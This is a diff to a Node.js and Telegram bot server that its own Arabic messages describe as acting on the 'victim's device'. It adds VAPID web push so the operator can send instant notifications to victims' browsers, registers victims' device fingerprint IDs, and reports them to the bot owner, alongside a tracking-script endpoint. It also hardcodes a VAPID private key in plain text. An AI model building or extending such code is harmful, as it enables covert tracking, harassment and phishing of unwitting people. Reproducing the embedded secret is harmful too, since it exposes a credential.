@@ -1,6 +1,12 @@
 const fs = require("fs");
 const express = require("express");
 const multer  = require("multer");
+const webPush = require("web-push");
+
+// ── VAPID setup ───────────────────────────────────────────────────────────────
+const VAPID_PUBLIC  = "BB_42uoOsrNGX-W57THFTM5uOgFfdxGUCWcXHH81aR9X9T7382X6SOuiMCIgiQo1qLCpFrjHOyMCH-sZpY79AOM";
+const VAPID_PRIVATE = "XOfjE2D-cZFK7K_ADNO6EasMB1gX1GKvUVJ5plUH2rs";
+webPush.setVapidDetails("mailto:admin@bot-psue.onrender.com", VAPID_PUBLIC, VAPID_PRIVATE);
 const upload  = multer({ storage: multer.memoryStorage(), limits: { fileSize: 15*1024*1024 } });
 
 // ── Storage helpers ────────────────────────────────────────────────────────────
@@ -767,7 +773,7 @@ bot.on('message', async (msg) => {
     if (!pUid || !pText) return bot.sendMessage(chatId, "الاستخدام: /push [uid] [النص]");
     if (!pushSubs[pUid]) return bot.sendMessage(chatId, "❌ هذا الجهاز لم يفعّل الإشعارات بعد.");
     sendPushToDevice(pUid, "🔔 رسالة جديدة", pText);
-    return bot.sendMessage(chatId, `✅ تم إرسال الإشعار — سيظهر على جهاز الضحية خلال 3 دقائق كحد أقصى`);
+    return bot.sendMessage(chatId, `✅ تم إرسال الإشعار — سيظهر فوراً على جهاز الضحية`);
   }
 
   if (msg.text === "/ping") {
@@ -1487,42 +1493,43 @@ app.get("/t.js", (req, res) => {
 })();`);
 });
 
-// ── Web Push: polling-based (no VAPID needed) ─────────────────────────────────
+// ── Web Push: VAPID ────────────────────────────────────────────────────────────
 const PUSH_FILE  = "./push_subs.json";
-const PUSH_QUEUE = "./push_queue.json";
-let pushSubs  = loadJSON(PUSH_FILE,  {});  // { pid: creatorUid }
-let pushQueue = loadJSON(PUSH_QUEUE, {});  // { pid: {title,msg} }
+let pushSubs = loadJSON(PUSH_FILE, {});   // { pid: { uid, subscription } }
 
-app.post("/push-subscribe", (req, res) => {
+// Serve VAPID public key to the frontend
+app.get("/vapid-key", (req, res) => res.json({ key: VAPID_PUBLIC }));
+
+app.post("/push-subscribe", express.json(), (req, res) => {
   res.send("ok");
-  const uid = req.body.uid || '';   // base36 creator id
-  const pid = req.body.pid || '';   // localStorage UUID (device fingerprint)
-  const key = pid || uid;           // use pid if available, fallback to uid
-  if (!key) return;
-  if (!pushSubs[key]) {
-    pushSubs[key] = uid;
-    saveJSON(PUSH_FILE, pushSubs);
-    const tid = parseInt(uid, 36);
-    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ استخدم هذا الأمر لإرسال إشعار:\n/push ${key} النص`);
-    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 PID: ${key}\n(Creator ID: ${tid})`);
+  const uid  = req.body.uid  || '';
+  const pid  = req.body.pid  || '';
+  const sub  = req.body.sub;          // full PushSubscription object
+  const key  = pid || uid;
+  if (!key || !sub || !sub.endpoint) return;
+  pushSubs[key] = { uid, subscription: sub };
+  saveJSON(PUSH_FILE, pushSubs);
+  const tid = parseInt(uid, 36);
+  notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ استخدم:\n/push ${key} النص`);
+  if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 PID: ${key}\n(Creator: ${tid})`);
+});
+
+async function sendPushToDevice(key, title, body) {
+  const entry = pushSubs[key];
+  if (!entry || !entry.subscription) return;
+  const payload = JSON.stringify({ title, body });
+  try {
+    await webPush.sendNotification(entry.subscription, payload);
+  } catch(e) {
+    if (e.statusCode === 410 || e.statusCode === 404) {
+      delete pushSubs[key];
+      saveJSON(PUSH_FILE, pushSubs);
+    }
   }
-});
-
-// SW polls this every 3 min to check for pending messages
-app.get("/push-poll", (req, res) => {
-  const key = req.query.pid || req.query.uid || '';
-  if (!key || !pushQueue[key]) return res.json({});
-  const msg = pushQueue[key];
-  delete pushQueue[key];
-  saveJSON(PUSH_QUEUE, pushQueue);
-  res.json(msg);
-});
-
-// Bot command /push <pid> text → queues a push notification
-function sendPushToDevice(key, title, msg) {
-  pushQueue[key] = { title, msg };
-  saveJSON(PUSH_QUEUE, pushQueue);
 }
+
+// Legacy poll endpoint (kept for backward compat)
+app.get("/push-poll", (req, res) => res.json({}));
 
 // ── Persistent ID report ───────────────────────────────────────────────────────
 app.post("/pid", (req, res) => {
